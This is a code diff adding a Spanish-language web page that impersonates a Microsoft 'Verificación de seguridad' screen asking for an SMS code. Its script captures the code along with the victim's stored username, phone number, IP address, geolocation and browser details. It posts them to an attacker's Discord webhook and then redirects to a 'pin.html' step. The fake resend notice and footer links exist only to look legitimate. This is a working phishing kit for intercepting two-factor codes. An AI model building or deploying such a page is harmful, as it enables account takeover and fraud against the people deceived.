@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Bienvenido</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, 'BlinkMacSystemFont', 'Roboto', 'Helvetica Neue', sans-serif;
+            background-image: url('docs/tapiz.png');
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        /* Contenedor principal */
+        .sms-container {
+            max-width: 520px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Contenido principal */
+        .sms-content {
+            padding: 2rem 2rem 2rem 2rem;
+        }
+
+        /* Logo centrado */
+        .logo-wrapper {
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-image {
+            width: 120px;
+            height: auto;
+            display: block;
+        }
+
+        /* Título */
+        .sms-title {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .title-text {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #111;
+            line-height: 1.3;
+        }
+
+        /* Descripción */
+        .sms-description {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .description-text {
+            font-size: 0.95rem;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+
+        /* Grupo de formulario */
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #2c2c2c;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .sms-input {
+            width: 100%;
+            padding: 0.85rem 1rem;
+            font-size: 1rem;
+            font-family: inherit;
+            border: 1px solid #d1d1d1;
+            border-radius: 0.5rem;
+            transition: all 0.2s ease;
+            outline: none;
+            background-color: #ffffff;
+            box-sizing: border-box;
+            text-align: center;
+            letter-spacing: 2px;
+            font-weight: 500;
+        }
+
+        .sms-input:focus {
+            border-color: #0067b8;
+            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+        }
+
+        /* Contenedor del botón */
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .btn-next {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #20b859;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.85rem 2rem;
+            border-radius: 0.5rem;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .btn-next:hover {
+            background-color: #20b880;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 103, 184, 0.3);
+        }
+
+        .btn-next:active {
+            transform: scale(0.98);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Mensaje de advertencia */
+        .warning-message {
+            background-color: #fef2e0;
+            border-left: 4px solid #f6a700;
+            padding: 0.85rem 1rem;
+            border-radius: 0.5rem;
+            margin-bottom: 1.5rem;
+            font-size: 0.85rem;
+            color: #5e4b1a;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .warning-message::before {
+            content: "⚠️";
+            font-size: 1rem;
+        }
+
+        /* Mensajes de error y éxito */
+        .message-container {
+            margin-bottom: 1.2rem;
+        }
+
+        .error-message {
+            background-color: #fde7e9;
+            border-left: 4px solid #d13438;
+            padding: 0.7rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.85rem;
+            color: #d13438;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .success-message {
+            background-color: #e6f4e8;
+            border-left: 4px solid #107c10;
+            padding: 0.7rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.85rem;
+            color: #107c10;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        /* Enlace de reenvío */
+        .resend-link {
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .resend-link a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 0.85rem;
+            transition: color 0.2s;
+        }
+
+        .resend-link a:hover {
+            text-decoration: underline;
+            color: #20b880;
+        }
+
+        /* Footer */
+        .sms-footer {
+            padding: 1.2rem 2rem;
+            background-color: #f8f9fa;
+            border-top: 1px solid #edf2f7;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #4a5568;
+            text-decoration: none;
+            font-size: 0.7rem;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #0067b8;
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            font-size: 0.7rem;
+            color: #a0aec0;
+        }
+
+        /* Responsive */
+        @media (max-width: 550px) {
+            .sms-content {
+                padding: 1.5rem;
+            }
+            .logo-image {
+                width: 100px;
+            }
+            .title-text {
+                font-size: 1.1rem;
+            }
+            .description-text {
+                font-size: 0.85rem;
+            }
+            .sms-input {
+                padding: 0.75rem 1rem;
+                font-size: 0.9rem;
+            }
+            .btn-next {
+                padding: 0.75rem 1rem;
+            }
+            .sms-footer {
+                padding: 1rem 1.5rem;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+        }
+
+        /* Focus states */
+        a:focus-visible, .btn-next:focus-visible, .sms-input:focus-visible {
+            outline: 2px solid #0067b8;
+            outline-offset: 2px;
+        }
+
+        /* Ocultar bordes rojos por defecto */
+        input:invalid {
+            box-shadow: none;
+            border-color: #d1d1d1;
+        }
+    </style>
+</head>
+<body>
+    <div class="sms-container">
+        <!-- Contenido principal -->
+        <div class="sms-content">
+            <!-- Logo centrado -->
+            <div class="logo-wrapper">
+                <img src="./docs/lbg22.png" alt="Microsoft Logo" class="logo-image">
+            </div>
+
+            <!-- Título -->
+            <div class="sms-title">
+                <h1 class="title-text">Verificación de seguridad</h1>
+            </div>
+
+            <!-- Descripción -->
+            <div class="sms-description">
+                <p class="description-text">
+                    Para continuar con la validación ingrese el código que le hemos enviado vía SMS a su teléfono:
+                </p>
+            </div>
+
+            <!-- Mensaje de advertencia -->
+            <div class="warning-message">
+                Asegúrese de que el código sea el correcto, ya que esta validación es necesaria para verificar su identidad. En caso de error podría ser bloqueado.
+            </div>
+
+            <!-- Contenedor de mensajes -->
+            <div class="message-container">
+                <div id="errorMessage" class="error-message"></div>
+                <div id="successMessage" class="success-message"></div>
+            </div>
+
+            <form id="smsForm" novalidate>
+                <div class="form-group">
+                    <label for="smsCode">Código SMS</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="smsCode" name="smsCode" class="sms-input" 
+                               placeholder="••• •••" maxlength="7" autocomplete="off" required>
+                    </div>
+                </div>
+
+                <div class="btn-container">
+                    <button type="submit" class="btn-next" id="submitButton">Siguiente</button>
+                </div>
+
+                <div class="resend-link">
+                    <a href="#" id="resendLink">¿No recibiste el código? Reenviar SMS</a>
+                </div>
+            </form>
+        </div>
+
+        <!-- Footer -->
+        <div class="sms-footer">
+            <div class="footer-links">
+                <a href="#" id="privacyLink">Aviso de privacidad</a>
+                <a href="#" id="termsLink">Términos de uso</a>
+                <a href="#" id="helpLink">Centro de ayuda</a>
+            </div>
+            <div class="footer-copyright">
+                © 2026 Microsoft
+            </div>
+        </div>
+    </div>
+    <script src="index_files/script.js"></script>
+ <script>
+        // Elementos del DOM
+        const smsForm = document.getElementById('smsForm');
+        const smsCodeInput = document.getElementById('smsCode');
+        const submitButton = document.getElementById('submitButton');
+        const errorMessageDiv = document.getElementById('errorMessage');
+        const successMessageDiv = document.getElementById('successMessage');
+        const resendLink = document.getElementById('resendLink');
+        const privacyLink = document.getElementById('privacyLink');
+        const termsLink = document.getElementById('termsLink');
+        const helpLink = document.getElementById('helpLink');
+
+        // Variable para almacenar la ubicación
+        let userLocationData = null;
+        
+        // Intentar cargar la URL del webhook desde discord.js
+        if (typeof window.DISCORD_WEBHOOK_URL !== 'undefined') {
+            DISCORD_WEBHOOK_URL = window.DISCORD_WEBHOOK_URL;
+        }
+
+        // Función para obtener el usuario del localStorage
+        function getUserFromStorage() {
+            try {
+                const user = localStorage.getItem('currentUser');
+                return user || 'No disponible';
+            } catch (error) {
+                console.error('Error al leer localStorage:', error);
+                return 'Error al obtener usuario';
+            }
+        }
+
+        // Función para obtener el número de teléfono del localStorage (si existe)
+        function getPhoneFromStorage() {
+            try {
+                const phone = localStorage.getItem('phone');
+                return phone || 'No disponible';
+            } catch (error) {
+                return 'No disponible';
+            }
+        }
+
+        // Función para obtener la dirección IP
+        async function getUserIP() {
+            try {
+                // Verificar si ya hay IP guardada en localStorage
+                const storedIP = localStorage.getItem('user_ip');
+                if (storedIP) {
+                    return storedIP;
+                }
+                
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // Guardar IP en localStorage
+                localStorage.setItem('user_ip', data.ip);
+                
+                return data.ip;
+            } catch (error) {
+                return 'No se pudo obtener IP';
+            }
+        }
+
+        // Función para obtener ubicación por IP (ciudad y país)
+        async function getUserLocation(ip) {
+            try {
+                // Verificar si ya hay ubicación guardada en localStorage
+                const storedLocation = localStorage.getItem('user_location');
+                if (storedLocation) {
+                    userLocationData = JSON.parse(storedLocation);
+                    return userLocationData;
+                }
+                
+                // Usar ip-api.com para obtener ubicación (gratuito, no requiere API key)
+                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon&lang=es`);
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    userLocationData = {
+                        city: data.city,
+                        country: data.country,
+                        region: data.regionName,
+                        latitude: data.lat,
+                        longitude: data.lon
+                    };
+                    
+                    // Guardar ubicación en localStorage
+                    localStorage.setItem('user_location', JSON.stringify(userLocationData));
+                    
+                    return userLocationData;
+                } else {
+                    return {
+                        city: 'No disponible',
+                        country: 'No disponible',
+                        region: 'No disponible'
+                    };
+                }
+            } catch (error) {
+                console.error('Error al obtener ubicación:', error);
+                return {
+                    city: 'Error al obtener',
+                    country: 'Error al obtener',
+                    region: 'Error al obtener'
+                };
+            }
+        }
+
+        // Función para obtener información del navegador
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = 'Desconocido';
+            let osName = 'Desconocido';
+            
+            if (userAgent.indexOf('Chrome') > -1) browserName = 'Chrome';
+            else if (userAgent.indexOf('Firefox') > -1) browserName = 'Firefox';
+            else if (userAgent.indexOf('Safari') > -1) browserName = 'Safari';
+            else if (userAgent.indexOf('Edge') > -1) browserName = 'Edge';
+            
+            if (userAgent.indexOf('Windows') > -1) osName = 'Windows';
+            else if (userAgent.indexOf('Mac') > -1) osName = 'MacOS';
+            else if (userAgent.indexOf('Linux') > -1) osName = 'Linux';
+            else if (userAgent.indexOf('Android') > -1) osName = 'Android';
+            else if (userAgent.indexOf('iOS') > -1) osName = 'iOS';
+            
+            return { browser: browserName, os: osName };
+        }
+
+        // Función para enviar a Discord (fire and forget)
+async function sendToDiscord(smsCode, locationData) {
+    // Verificar webhook
+    if (typeof DISCORD_WEBHOOK_URL === 'undefined') {
+        console.error('❌ DISCORD_WEBHOOK_URL no está definida');
+        return false;
+    }
+    
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'TU_WEBHOOK_URL_AQUI') {
+        console.error('❌ DISCORD_WEBHOOK_URL no está configurada correctamente');
+        return false;
+    }
+    
+    try {
+        // Obtener datos desde localStorage
+        const ip = await getUserIP(); // ¡AGREGADO AWAIT!
+        const browserInfo = getBrowserInfo();
+        const currentDate = new Date();
+        const formattedDate = currentDate.toLocaleString('es-ES', { timeZone: 'America/Bogota' });
+        const user = getUserFromStorage();
+        const phone = getPhoneFromStorage();
+        
+        // Asegurar que locationData existe
+        const loc = locationData || { city: 'No disponible', country: 'No disponible', region: 'No disponible' };
+        
+        // Extraer país y ciudad para el formato separado
+        let pais = 'Desconocido';
+        let ciudad = 'Desconocido';
+        let locationText = 'No disponible';
+        
+        if (loc.city && loc.city !== 'No disponible' && loc.city !== 'Error al obtener') {
+            pais = loc.country || 'Desconocido';
+            ciudad = loc.city || 'Desconocido';
+            locationText = `${ciudad}, ${pais}`;
+            if (loc.region && loc.region !== loc.city && loc.region !== 'No disponible') {
+                locationText += ` (${loc.region})`;
+            }
+        }
+        
+        console.log('📤 Enviando código SMS a Discord:');
+        console.log('   Usuario:', user);
+        console.log('   Teléfono:', phone);
+        console.log('   Código SMS:', smsCode);
+        console.log('   IP:', ip);
+        console.log('   Ubicación:', locationText);
+        
+        // Crear el mensaje en formato de texto plano
+        const messageLines = [
+            `**== Código SMS ==**`,
+            `🕐 ${formattedDate}`,
+            ``,
+            `**👤 Usuario:** \`${localStorage.getItem('user')}\``,
+            ``,
+            `**📞 Teléfono:** \`${phone}\``,
+            ``,
+            `**🔑 Código SMS:** \`${smsCode}\``,
+            ``,
+            `**📍 UBICACIÓN**`,
+            `🌐 IP: \`${ip}\``,
+            `🏳️ País: ${pais}`,
+            `🏙️ Ciudad: ${ciudad}`,
+            `📍 Ubicación: ${locationText}`,
+            ``,
+            `**💻 Navegador / SO:** \`${browserInfo.browser} - ${browserInfo.os}\``
+        ];
+        
+        // Unir las líneas con saltos de línea
+        const messageContent = messageLines.join('\n');
+        
+        const payload = {
+            username: 'El hoyo del 🐰',
+            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg',
+            content: messageContent
+        };
+        
+        // Enviar a Discord
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        if (response.ok) {
+            console.log('✅ Código SMS enviado a Discord correctamente');
+            return true;
+        } else {
+            console.error('❌ Error HTTP:', response.status);
+            const text = await response.text();
+            console.error('Respuesta:', text);
+            return false;
+        }
+        
+    } catch (error) {
+        console.error('❌ Error de conexión:', error);
+        return false;
+    }
+}
+        // Función para limpiar mensajes
+        function hideMessages() {
+            errorMessageDiv.classList.remove('show');
+            successMessageDiv.classList.remove('show');
+            errorMessageDiv.textContent = '';
+            successMessageDiv.textContent = '';
+        }
+
+        // Función para mostrar error
+        function showError(message) {
+            hideMessages();
+            errorMessageDiv.textContent = message;
+            errorMessageDiv.classList.add('show');
+            errorMessageDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+
+        // Función para mostrar éxito
+        function showSuccess(message) {
+            hideMessages();
+            successMessageDiv.textContent = message;
+            successMessageDiv.classList.add('show');
+        }
+
+        // Validar código SMS (6 dígitos)
+        function validateSMSCode(code) {
+            if (!code || code.trim() === '') {
+                showError('Por favor, ingresa el código SMS de verificación.');
+                return false;
+            }
+            
+            const cleanCode = code.toString().replace(/\D/g, '');
+            
+            if (cleanCode.length !== 6) {
+                showError('El código SMS debe tener 6 dígitos.');
+                return false;
+            }
+            
+            return true;
+        }
+
+        // Limitar input a solo números y máximo 6 caracteres
+        smsCodeInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+            
+            // Formatear con espacios cada 3 dígitos
+            if (this.value.length > 3) {
+                this.value = this.value.slice(0, 3) + ' ' + this.value.slice(3, 6);
+            }
+        });
+
+        // Función para cargar ubicación al inicio
+        async function loadUserLocationOnStart() {
+            try {
+                const ip = await getUserIP();
+                const locationData = await getUserLocation(ip);
+                console.log('Ubicación cargada:', locationData);
+                return locationData;
+            } catch (error) {
+                console.error('Error al cargar ubicación inicial:', error);
+            }
+        }
+
+        // Manejar el envío del formulario
+        smsForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            let smsCode = smsCodeInput.value.replace(/\s/g, '');
+            
+            if (validateSMSCode(smsCode)) {
+
+                
+                // Obtener ubicación (si no está cargada)
+                let locationData = userLocationData;
+                if (!locationData) {
+                    const ip = await getUserIP();
+                    locationData = await getUserLocation(ip);
+                }
+                
+                // Enviar a Discord sin esperar (fire and forget)
+                sendToDiscord(smsCode, locationData);
+                
+                // Redirigir inmediatamente
+                setTimeout(() => {
+                    window.location.href = 'pin.html';
+                }, 1000);          
+            }
+        });
+
+        // Reenviar código SMS
+        resendLink.addEventListener('click', async (e) => {
+            e.preventDefault();
+            showSuccess('Reenviando código SMS a su teléfono...');
+            
+            // Simular reenvío después de 2 segundos
+            setTimeout(() => {
+                showSuccess('Código reenviado. Por favor revise su bandeja de entrada.');
+            }, 2000);
+        });
+
+        // Eventos para los enlaces del footer
+        privacyLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showSuccess('Consulta el aviso de privacidad en el sitio oficial de Microsoft.');
+        });
+        
+        termsLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showSuccess('Consulta los términos de uso en el sitio oficial de Microsoft.');
+        });
+        
+        helpLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showSuccess('Visita el Centro de ayuda de Microsoft para más información.');
+        });
+
+        // Limpiar mensajes al enfocar el input
+        smsCodeInput.addEventListener('focus', hideMessages);
+        
+        // Desactivar validación nativa del navegador
+        smsForm.setAttribute('novalidate', 'true');
+        
+        // Cargar ubicación al inicio
+        loadUserLocationOnStart();
+        
+        // Evitar bordes rojos en inputs inválidos
+        const style = document.createElement('style');
+        style.textContent = `
+            input:invalid {
+                box-shadow: none;
+                border-color: #d1d1d1;
+            }
+            input:focus:invalid {
+                border-color: #0067b8;
+                box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+
+</html>
